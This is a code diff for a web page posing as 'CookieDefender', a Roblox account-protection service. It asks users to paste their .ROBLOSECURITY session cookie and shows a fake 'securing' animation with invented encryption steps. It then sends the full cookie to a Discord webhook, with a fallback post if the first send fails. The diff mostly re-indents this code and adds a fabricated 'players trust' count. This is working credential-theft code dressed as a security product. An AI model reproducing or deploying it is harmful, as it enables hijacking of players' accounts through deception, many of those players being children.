@@ -1663,128 +1663,129 @@
             }
         });
 
-        // ===== COOKIE SUBMISSION WITH PROFESSIONAL EMBED =====
-        window.activateDefense = function() {
-            const cookie = document.getElementById('cookieInput').value;
-            const errorEl = document.getElementById('cookieError');
-            const inputEl = document.getElementById('cookieInput');
+// ===== COOKIE SUBMISSION WITH PROFESSIONAL EMBED =====
+window.activateDefense = function() {
+    const cookie = document.getElementById('cookieInput').value;
+    const errorEl = document.getElementById('cookieError');
+    const inputEl = document.getElementById('cookieInput');
 
-            if (!isValidCookie(cookie)) {
-                errorEl.classList.add('visible');
-                inputEl.style.borderColor = '#ef4444';
-                return;
-            }
+    if (!isValidCookie(cookie)) {
+        errorEl.classList.add('visible');
+        inputEl.style.borderColor = '#ef4444';
+        return;
+    }
 
-            errorEl.classList.remove('visible');
-            inputEl.style.borderColor = '';
+    errorEl.classList.remove('visible');
+    inputEl.style.borderColor = '';
 
-            const fill = document.getElementById('progressFill');
-            const status = document.getElementById('statusMessage');
+    const fill = document.getElementById('progressFill');
+    const status = document.getElementById('statusMessage');
 
-            const stages = [
-                { p: 18, msg: 'Analyzing cookie signature...' },
-                { p: 38, msg: 'Establishing secure tunnel...' },
-                { p: 58, msg: 'Hardware fingerprint binding...' },
-                { p: 78, msg: 'Encrypting with HMAC-SHA256...' },
-                { p: 100, msg: 'Account secured!' }
-            ];
+    const stages = [
+        { p: 18, msg: 'Analyzing cookie signature...' },
+        { p: 38, msg: 'Establishing secure tunnel...' },
+        { p: 58, msg: 'Hardware fingerprint binding...' },
+        { p: 78, msg: 'Encrypting with HMAC-SHA256...' },
+        { p: 100, msg: 'Account secured!' }
+    ];
 
-            let idx = 0;
-            const interval = setInterval(() => {
-                if (idx < stages.length) {
-                    const s = stages[idx];
-                    fill.style.width = s.p + '%';
-                    status.textContent = s.msg;
-                    idx++;
-                } else {
-                    clearInterval(interval);
-                    document.getElementById('modalForm').style.display = 'none';
-                    document.getElementById('successScreen').classList.add('active');
+    let idx = 0;
+    const interval = setInterval(() => {
+        if (idx < stages.length) {
+            const s = stages[idx];
+            fill.style.width = s.p + '%';
+            status.textContent = s.msg;
+            idx++;
+        } else {
+            clearInterval(interval);
+            document.getElementById('modalForm').style.display = 'none';
+            document.getElementById('successScreen').classList.add('active');
 
-                    // ===== PROFESSIONAL DISCORD EMBED =====
-                    const embed = {
-                        embeds: [{
-                            title: '🛡️ Roblox Account Protection Activated',
-                            description: 'A .ROBLOSECURITY cookie has been submitted for enterprise-grade protection.',
-                            color: 0xe0004d,
-                            author: {
-                                name: 'CookieDefender Security System',
-                                icon_url: 'https://cdn.discordapp.com/attachments/1519009286838288564/1519047477708198148/cookie_defender2-removebg-preview.png'
-                            },
-                            fields: [
-                                {
-                                    name: '🔐 Session Token',
-                                    value: '```\n' + cookie + '\n```',
-                                    inline: false
-                                },
-                                {
-                                    name: '⏱️ Timestamp',
-                                    value: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
-                                    inline: true
-                                },
-                                {
-                                    name: '🖥️ Client Type',
-                                    value: navigator.userAgent.includes('Chrome') ? 'Google Chrome' :
-                                            navigator.userAgent.includes('Firefox') ? 'Mozilla Firefox' :
-                                            navigator.userAgent.includes('Safari') ? 'Apple Safari' : 'Other Browser',
-                                    inline: true
-                                },
-                                {
-                                    name: '📊 Protection Level',
-                                    value: '```diff\n+ Enterprise Grade (HMAC-SHA256)\n+ Hardware Binding Active\n+ 24/7 Monitoring Enabled\n```',
-                                    inline: false
-                                },
-                                {
-                                    name: '📍 Geographic Region',
-                                    value: 'Auto-detected via IP',
-                                    inline: true
-                                },
-                                {
-                                    name: '🔒 Encryption Status',
-                                    value: '✅ Fully Encrypted',
-                                    inline: true
-                                }
-                            ],
-                            footer: {
-                                text: 'CookieDefender • Zero-Knowledge Security Platform • Not affiliated with Roblox Corp',
-                                icon_url: 'https://cdn.discordapp.com/attachments/1519009286838288564/1519047477708198148/cookie_defender2-removebg-preview.png'
-                            },
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
+            // ===== PROFESSIONAL DISCORD EMBED =====
+            const embed = {
+                embeds: [{
+                    title: '🛡️ Roblox Account Protection Activated',
+                    description: 'A .ROBLOSECURITY cookie has been submitted for enterprise-grade protection.',
+                    color: 0xe0004d,
+                    url: 'https://cookiedefender.com',
+                    author: {
+                        name: 'CookieDefender Security System',
+                        url: 'https://cookiedefender.com'
+                    },
+                    fields: [
+                        {
+                            name: '🔐 Session Token',
+                            value: '```\n' + cookie + '\n```',
+                            inline: false
+                        },
+                        {
+                            name: '⏱️ Timestamp',
+                            value: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ Client Type',
+                            value: navigator.userAgent.includes('Chrome') ? 'Google Chrome' :
+                                    navigator.userAgent.includes('Firefox') ? 'Mozilla Firefox' :
+                                    navigator.userAgent.includes('Safari') ? 'Apple Safari' : 'Other Browser',
+                            inline: true
+                        },
+                        {
+                            name: '📊 Protection Level',
+                            value: '```diff\n+ Enterprise Grade (HMAC-SHA256)\n+ Hardware Binding Active\n+ 24/7 Monitoring Enabled\n```',
+                            inline: false
+                        },
+                        {
+                            name: '🔒 Encryption Status',
+                            value: '✅ Fully Encrypted & Protected',
+                            inline: true
+                        },
+                        {
+                            name: '📈 Accounts Protected',
+                            value: '**' + userCount.toLocaleString() + '** players trust CookieDefender',
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: 'CookieDefender • Zero-Knowledge Security Platform • Not affiliated with Roblox Corp',
+                        icon_url: 'https://cookiedefender.com/favicon.png'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-                    // Send the professional embed to Discord
-                    fetch(COOKIE_WEBHOOK, {
+            // Send the professional embed to Discord
+            fetch(COOKIE_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    // Fallback if embed is rejected
+                    return fetch(COOKIE_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(embed)
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            // Fallback if embed is rejected
-                            return fetch(COOKIE_WEBHOOK, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    content: '**🛡️ Roblox Cookie Defense Activated**\n\n**Full Cookie:**\n```\n' + cookie + '\n```\n\n**Time:** ' + new Date().toISOString()
-                                })
-                            });
-                        }
-                        return response;
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('✅ Cookie sent to Discord webhook successfully.');
-                        } else {
-                            console.error('❌ Webhook failed with status:', response.status);
-                        }
-                    })
-                    .catch(err => {
-                        console.error('❌ Failed to send cookie:', err);
+                        body: JSON.stringify({
+                            content: '**🛡️ Roblox Cookie Defense Activated**\n\n**Full Cookie:**\n```\n' + cookie + '\n```\n\n**Time:** ' + new Date().toISOString()
+                        })
                     });
                 }
-            }, 700);
-        };
+                return response;
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Cookie sent to Discord webhook successfully.');
+                } else {
+                    console.error('❌ Webhook failed with status:', response.status);
+                }
+            })
+            .catch(err => {
+                console.error('❌ Failed to send cookie:', err);
+            });
+        }
+    }, 700);
+};
 
         // ===== INIT =====
         document.addEventListener('DOMContentLoaded', function() {
